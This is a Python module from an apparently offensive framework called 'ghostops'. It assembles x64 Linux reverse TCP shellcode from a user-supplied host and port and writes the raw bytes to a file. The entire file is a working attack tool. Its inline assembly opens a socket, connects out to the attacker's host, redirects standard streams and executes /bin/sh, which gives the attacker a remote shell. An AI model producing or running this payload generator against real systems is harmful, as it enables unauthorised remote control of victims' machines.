from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KsError
from ghostops.core.module_base import BaseModule
from ghostops.core.utils import Logger
from pathlib import Path

class LinuxX64ShellReverseTcp(BaseModule):
    module_name = "LinuxX86ReverseTcp"
    module_description = "Generates reverse TCP payload targeting Linux x64 platforms."
    module_author = "Awagat Dhungana <4w4647@gmail.com>"
    module_category = "payload"
    module_target_os = ["linux"]
    module_target_architecture = ["x64"]

    @staticmethod
    def add_arguments(parser):
        parser.add_argument("--host", required=True, type=str, help="Target host")
        parser.add_argument("--port", required=True, type=int, help="Target port")
        parser.add_argument(
            "--output", required=True, type=str, help="Output filename for raw shellcode (e.g., ghostops.bin)"
        )
    
    @staticmethod
    def host_to_hex(host: str) -> str:
        try:
            octets = host.split('.')
            if len(octets) != 4:
                raise ValueError("Invalid IPv4 address format")
            return ''.join(f'{int(octet):02x}' for octet in reversed(octets))
        except Exception as e:
            Logger.log("flaw", f"Invalid host '{host}': {e}")
            raise

    @staticmethod
    def port_to_hex(port: int) -> str:
        if not (0 < port < 65536):
            raise ValueError(f"Port number must be between 1 and 65535, got {port}")
        return f'{port & 0xFF:02x}{(port >> 8) & 0xFF:02x}'

    @staticmethod
    def main(args):
        Logger.log("info", f"HOST {args.host}")
        Logger.log("info", f"PORT {args.port}")
        print()

        try:
            host_hex = LinuxX64ShellReverseTcp.host_to_hex(args.host)
            port_hex = LinuxX64ShellReverseTcp.port_to_hex(args.port)
        except Exception:
            Logger.log("flaw", "Invalid host or port provided.")
            return

        shellcode_template = f"""
        push   0x29
        pop    rax
        cdq
        push   0x2
        pop    rdi
        push   0x1
        pop    rsi
        syscall
        xchg   rdi,rax
        movabs rcx,0x{host_hex}{port_hex}0002
        push   rcx
        mov    rsi,rsp
        push   0x10
        pop    rdx
        push   0x2a
        pop    rax
        syscall
        push   0x3
        pop    rsi
        dec    rsi
        push   0x21
        pop    rax
        syscall
        jne    0x27
        push   0x3b
        pop    rax
        cdq
        movabs rbx,0x68732f6e69622f
        push   rbx
        mov    rdi,rsp
        push   rdx
        push   rdi
        mov    rsi,rsp
        syscall
        """

        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_64)
            encoding, _ = ks.asm(shellcode_template)
        except KsError as e:
            Logger.log("flaw", f"Assembly failed: {e}")
            return

        shellcode_bytes = bytes(encoding)
        Logger.log("good", f"Shellcode size: {len(shellcode_bytes)} bytes")

        output_path = Path(args.output)
        try:
            with open(output_path, "wb") as f:
                f.write(shellcode_bytes)
            Logger.log("good", f"Raw shellcode written to {output_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to write shellcode to file: {e}")